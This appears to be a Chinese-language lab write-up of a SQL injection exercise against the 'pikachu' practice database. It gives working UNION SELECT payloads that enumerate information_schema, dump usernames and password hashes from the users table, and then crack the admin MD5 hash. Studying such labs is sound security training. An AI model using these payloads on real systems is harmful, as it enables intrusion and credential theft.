1、确认存在漏洞

根据错误提示，单引号参与了SQL的执行，我们确定存在注入漏洞
2、利用order by报错确认主查询里有多少个字段
用order by 5 查询报错，提示没有第5列，折半查找，再使用order by 3尝试仍然报错：

继续用order by 2尝试，没有报错，说明主查询里是2个字段。
3、构造payload爆出数据库名：
xx'union select database(),1;  #

4、构造payload，通过information_schema查询pikachu数据库有哪些表：
xx' union select table_name,1 from information_schema.tables where table_schema='pikachu'#
或
xx' union select table_name,1 from information_schema.columns where table_schema='pikachu'#
结果显示，pikachu数据库中有5张表：

5、构造payload，继续查询users表中有哪些字段：
xx'union select column_name,1 from information_schema.columns wheretable_name='users' #
查出了users表中的所有字段：

6、最后查出当前数据库pikachu、表users，可以构造一个payload查出users表中的username和password字段的值：
xx'union select username,password from users #

到此为止，我们已经知道了数据库中有三个用户及其密码，尝试用md5解密网站（https://www.cmd5.com/）破解用户密码：

得到admin用户的密码是123456.
